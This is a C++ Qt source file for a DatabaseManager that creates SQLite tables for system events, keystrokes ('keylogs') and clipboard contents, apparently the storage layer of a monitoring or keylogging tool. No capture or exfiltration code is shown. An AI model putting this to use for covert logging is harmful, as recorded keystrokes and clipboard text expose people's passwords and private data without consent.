#include "databasemanager.h"
#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <QDebug>

DatabaseManager* DatabaseManager::m_instance = nullptr;

DatabaseManager* DatabaseManager::instance() {
    if (!m_instance) {
        m_instance = new DatabaseManager();
    }
    return m_instance;
}

DatabaseManager::DatabaseManager(QObject *parent) : QObject(parent) {}

bool DatabaseManager::initDatabase() {
    QString dbPath = QCoreApplication::applicationDirPath();

    m_db = QSqlDatabase::addDatabase("QSQLITE");
    m_db.setDatabaseName(dbPath + "/events.db");

    if (!m_db.open()) {
        qDebug() << "Unable to open database: " << m_db.lastError().text();
        return false;
    }

    QSqlQuery query;
    // Table for general events (App launches, Power, USB)
    if (!query.exec("CREATE TABLE IF NOT EXISTS events ("
                   "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                   "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, "
                   "type TEXT, "
                   "description TEXT)")) {
        qDebug() << "Error creating events table: " << query.lastError().text();
    }

    // Table for Keylogging
    if (!query.exec("CREATE TABLE IF NOT EXISTS keylogs ("
                   "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                   "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, "
                   "key TEXT)")) {
        qDebug() << "Error creating keylogs table: " << query.lastError().text();
    }

    // Table for Clipboard
    if (!query.exec("CREATE TABLE IF NOT EXISTS clipboard ("
                   "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                   "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, "
                   "content TEXT)")) {
        qDebug() << "Error creating clipboard table: " << query.lastError().text();
    }

    return true;
}

void DatabaseManager::logEvent(const QString& type, const QString& description) {
    QSqlQuery query;
    query.prepare("INSERT INTO events (type, description) VALUES (?, ?)");
    query.addBindValue(type);
    query.addBindValue(description);
    query.exec();
}

void DatabaseManager::logKey(const QString& key) {
    QSqlQuery query;
    query.prepare("INSERT INTO keylogs (key) VALUES (?)");
    query.addBindValue(key);
    query.exec();
}

void DatabaseManager::logUsb(const QString& action, const QString& deviceName) {
    logEvent("USB", QString("%1: %2").arg(action, deviceName));
}

void DatabaseManager::logClipboard(const QString& text) {
    QSqlQuery query;
    query.prepare("INSERT INTO clipboard (content) VALUES (?)");
    query.addBindValue(text);
    query.exec();
}
